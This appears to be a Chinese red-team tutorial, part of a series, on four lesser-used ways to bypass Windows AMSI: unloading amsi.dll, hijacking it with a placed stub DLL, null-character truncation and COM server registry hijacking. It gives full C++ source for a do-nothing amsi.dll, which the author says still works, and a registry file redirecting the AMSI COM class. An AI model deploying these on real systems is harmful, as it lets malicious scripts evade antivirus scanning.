Bypass AMSI的前世今生(4) - 非主流合集
0x00 前言
分析完了[BA1-4]，我相信大家对AMSI已经有了不错的认知，也能够利用混淆bypass AMSI了。今天我
们讨论的是非主流的bypass amsi的合集，也就是[BA5-8]，分别如下：
[BA5] 卸载当前进程中的amsi.dll
[BA6] PowerShell.exe同目录下放入傀儡amsi.dll劫持正常amsi.dll（正常amsi.dll存在于
c:\windows\system32\amsi.dll）
[BA7] Null字符绕过
[BA8] COM Server劫持（劫持杀软接入接口）
这些方法曾今都能起到bypass AMSI作用，但是很鸡肋。其中[BA5]实际测试的时候是不行的，
powershell进程要崩溃，其它有的早已修复。
既然有非主流，那么主流手法有哪些呢？这里提一下，目前主流好用的手法为2种，第一种我们已经在
《Bypass AMSI的前世今生(3) - 脚本混淆和一行命令关闭AMSI》种提到的混淆+”一行命令“，另外一种就
是内存补丁，将在下一节讲到。
这一节我们先来测试一遍这4个非主流手法以及他的思路。
0x01 卸载当前进程中的amsi.dll
在前面的文章中，我们知道amsi其实是以dll形式存在的，powershell启动的时候，会加载amsi.dll，然
后调用其中的AmsiScanString或AmsiScanBuffer函数来进行检测（在部分老的win10系统中使用的是
AmsiScanString，较新的系统使用的是AmsiScanBuffer，大约分界线是1709）。
因此我们就有了对抗思路，我们能不能unload amsi.dll呢？这样amsi.dll不存在了，就不能检测到了。
答案是不行的，这样太暴力了，我们深入想，我们unload amsi.dll，powershell使用
AmsiOpenSession的时候，函数指针指向的位置不是真正的AmsiOpenSession代码，就会崩溃。我们
虽然unload了amsi.dll，但是我们的powershell进程也崩了，2败俱伤。我们使用process hacker工具来
测试下。
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 1 / 7 - Welcome to www.red-team.cn
调用AmsiOpenSession的时候，直接就崩溃了，因此这种暴力unload的方法是不行的。既然unload不
行我们来看看劫持amsi.dll
0x02 劫持amsi.dll
PowerShell.exe同目录下放入傀儡amsi.dll劫持正常amsi.dll（正常amsi.dll存在于
c:\windows\system32\amsi.dll），这个都不用过多解释，常规的dll劫持技术，由于研发人员使用
LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll，因此我们在
powerShell.exe同目录下放一个amsi.dll做劫持。但是win7以上也可以修改注册表，强制加载system32
下的dll。具体的详情，可以阅读官方文档：https://docs.microsoft.com/en-us/windows/win32/dlls/d
ynamic-link-library-search-order
劫持amsi.dll有2个问题：
怎么放置傀儡amsi.dll，也就是放置在哪个目录
amsi.dll要导出哪些函数，不导出amsi.dll本身的函数，会导致和unload一样的问题，使得
powershell不能工作了
解决第一个问题
我们通过process Monitor来观察下powershell.exe对amsi.dll的加载顺序。我们过滤powershell.exe进
程名来观察下：
我们来看看powershell先在如下目录去寻找amsi.dll，没有找到，然后再去system32目录下。
位置是找到了，我们来解决第二个问题。
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0
.0.0__31bf3856ad364e35\
C:\Windows\System32\WindowsPowerShell\v1.0\
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 2 / 7 - Welcome to www.red-team.cn
解决第二个问题
第二个问题也是很好解决的，官方给了api文档，我们抄一抄就好了，但是呢，第一篇我们说过了，官方
文档也是不全的，文档比较老了，目前新的amsi增加了其他几个导出函数，抄起ida，按上F5，补一
下。我使用的是vs2019，创建一个动态链接库项目，然后创建下面2个文件：
// amsi.h
#pragma once
#include "pch.h"
LPCWSTR appName = NULL;
typedef struct HAMSICONTEXT {
    DWORD       Signature;          // "AMSI" or 0x49534D41
    PWCHAR      AppName;           // set by AmsiInitialize
    DWORD       Antimalware;       // set by AmsiInitialize
    DWORD       SessionCount;      // increased by AmsiOpenSession
} HAMSICONTEXT;
typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN = 0x00,
    AMSI_RESULT_NOT_DETECTED = 0x01,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4fff,
    AMSI_RESULT_DETECTED = 0x8000,
} AMSI_RESULT;
typedef struct HAMSISESSION {
    DWORD amsiSession;
} HAMSISESSION;
extern "C" __declspec(dllexport) void AmsiInitialize(LPCWSTR appName, 
HAMSICONTEXT* amsiContext);
extern "C" __declspec(dllexport) void AmsiOpenSession(HAMSICONTEXT amsiContext, 
HAMSISESSION* amsiSession);
extern "C" __declspec(dllexport) void AmsiCloseSession(HAMSICONTEXT amsiContext, 
HAMSISESSION amsiSession);
extern "C" __declspec(dllexport) void AmsiScanBuffer(HAMSICONTEXT amsiContext, 
PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, 
AMSI_RESULT* result);
extern "C" __declspec(dllexport) void AmsiScanString(HAMSICONTEXT amsiContext, 
LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* 
result);
extern "C" __declspec(dllexport) void AmsiUninitialize(HAMSICONTEXT 
amsiContext);
extern "C" __declspec(dllexport) int AmsiUacInitialize(DWORD* a1);
extern "C" __declspec(dllexport) int AmsiUacScan(int a1, int a2, AMSI_RESULT* 
result, DWORD* a4);
extern "C" __declspec(dllexport) void** AmsiUacUninitialize(LPVOID pv);
//amsi.cpp
#include "pch.h"
#include "amsi.h"
#include "combaseapi.h"
/*
typedef struct HAMSICONTEXT {
    DWORD       Signature;          // "AMSI" or 0x49534D41
    PWCHAR      AppName;           // set by AmsiInitialize
    DWORD       Antimalware;       // set by AmsiInitialize
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 3 / 7 - Welcome to www.red-team.cn
编译好后，我们放入上面的目录试试：
起作用了，我们再测试另外一个目录，也是可以的。
    DWORD       SessionCount;      // increased by AmsiOpenSession
} HAMSICONTEXT;
*/
void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT* amsiContext) {
}
void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession) {
}
void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession) {
}
void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, 
LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result) {
}
void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR 
contentName, HAMSISESSION amsiSession, AMSI_RESULT * result) {
}
void AmsiUninitialize(HAMSICONTEXT amsiContext) {
}
int AmsiUacInitialize(DWORD* a1) {
    return 0;
}
int AmsiUacScan(int a1, int a2, AMSI_RESULT* result, DWORD* a4) {
    return 0;
}
void** AmsiUacUninitialize(LPVOID pv) {
    return NULL;
}
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 4 / 7 - Welcome to www.red-team.cn
劫持方法，是可行，但是缺陷也很明显：
这2个目录都需要管理员权限，普通用户不行
当然你也可以把powershell.exe 和 amsi.dll（劫持）复制到一个普通权限用户使用
有一个落地DLL文件，这个dll文件需要考虑免杀问题
这种dll劫持技术，defender杀应该只是时间问题（表示我测试的时候似乎全程defender无感）
0x03 Null字符绕过
这个问题已经被微软修复了https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledg
ments，这个问题的作者也写了详细文章http://standa-note.blogspot.com/2018/02/amsi-bypass-wit
h-null-character.html。我这儿就不班门弄斧了。只大致说下原理：
通过前面学习，我们知道扫描使用的是如下函数
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 5 / 7 - Welcome to www.red-team.cn
其中string传入的就是我们的脚本，这个地方可以空字符截断（ps:空字符截断真是随处可见），然后我
们只需在我们恶意脚本开头加入空字符，就可以bypass了。
修复方法很有意思，就是用了另外一个函数：
前面我说过win10中途换了扫描函数，原来是这个原因。
0x04 COM Server劫持
这个也是被微软修复了的问题，具体文章可以阅读https://enigma0x3.net/2017/07/19/bypassing-amsi
-via-com-server-hijacking/，我这儿也简单描述的原理。
amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先
从注册表HKCU中找对应的DLL，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了
微软修复了这个问题，通过直接调用 amsi.dll 的 DllGetClassObject() 函数替换 CoCreateInstance()，
可以避免注册表解析。
上面原作者文章中，作者提出dll劫持bypass这个修复，原理就是0x02中介绍的，只是把我们自己编译的
amsi.dll换成微软的老amsi.dll这个dll可是微软自己签名的dll，不会被杀，然后再劫持注册表，就又可以
愉快玩耍了，但是这种方法也很容易被杀软检测，直接监控这个注册表的创建就行了。因此这个方法也
不是很常用。
但是说句题外话，COM相关的技术应用，在对抗杀软上有很大的空间。
HRESULT WINAPI AmsiScanString(
  _In_     HAMSICONTEXT amsiContext,
  _In_     LPCWSTR      string,   // Will be terminated at the first null 
character
  _In_     LPCWSTR      contentName,
  _In_opt_ HAMSISESSION session,
  _Out_    AMSI_RESULT  *result
);
HRESULT WINAPI AmsiScanBuffer(
  _In_     HAMSICONTEXT amsiContext,
  _In_     PVOID        buffer,  // Not terminated at the null character
  _In_     ULONG        length,
  _In_     LPCWSTR      contentName,
  _In_opt_ HAMSISESSION session,
  _Out_    AMSI_RESULT  *result
  );
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-
4357bb0072ec}]
[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-
4357bb0072ec}\InProcServer32]
@="C:\\goawayamsi.dll"
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 6 / 7 - Welcome to www.red-team.cn
0x05 总结
本文中这些非主流bypass，第一个不能用，第三、第四个已经被修复。只有第二个目前依旧还能工作。
之所以记录下这些已经不能利用的方法，主要是学习思路，0x03中的空字符、0x04中的注册表优先级，
都是可以记录的技巧。
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-30
No. 7 / 7 - Welcome to www.red-team.cn